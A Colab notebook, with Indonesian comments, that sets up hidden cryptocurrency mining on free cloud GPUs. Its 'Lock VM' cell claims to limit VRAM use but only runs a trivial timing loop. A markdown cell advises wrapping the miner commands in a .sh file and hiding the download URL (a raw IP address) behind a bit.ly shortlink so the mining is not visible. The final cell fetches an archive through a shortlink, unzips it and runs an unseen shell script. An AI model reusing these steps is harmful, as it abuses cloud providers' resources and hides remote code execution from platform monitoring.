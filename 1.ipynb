{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "lucu1.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "_UAJP7QCHkac"
      },
      "source": [
        "**`LOCK VM = Semacam kek buat lock kinerja vram dibatasi biar engga ampe maximum tanpa mengurangi hashrate mining di algo apa aja`**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "iskFIXwEHjVd"
      },
      "source": [
        "#@title Lock VM { run: \"auto\" }\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "_4lciA3rIONZ"
      },
      "source": [
        "!nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "KSQINt19IK97"
      },
      "source": [
        "- `USAHAKAN MINER DI BIKIN REPO / DI UPLOAD FILE FTP BEBAS.. YANG PENTING COMMAND PANGGIL ENGGA DI LUAR.. SEMUA DI BUNGKUS DI FILE .sh + DI TAMBAHKAN SHORTLINK DI LINK DOWNLOAD REPO NYA.`\n",
        "\n",
        "- `CONTOH :`\n",
        "    - `!wget http://188.227.85.35:81/aria2/dl/Miner.zip di kasih shortlink jadi !wget https://bit.ly/Miner`\n",
        "\n",
        "- `UNZIP FILE MINER YANG DI SHORTLINK :`\n",
        "    - `!wget https://bit.ly/Miner && unzip Miner`"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "bxyHYAhoIL2L"
      },
      "source": [
        "!wget http://bit.ly/samawa22 && unzip samawa22 && bash sugeng.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}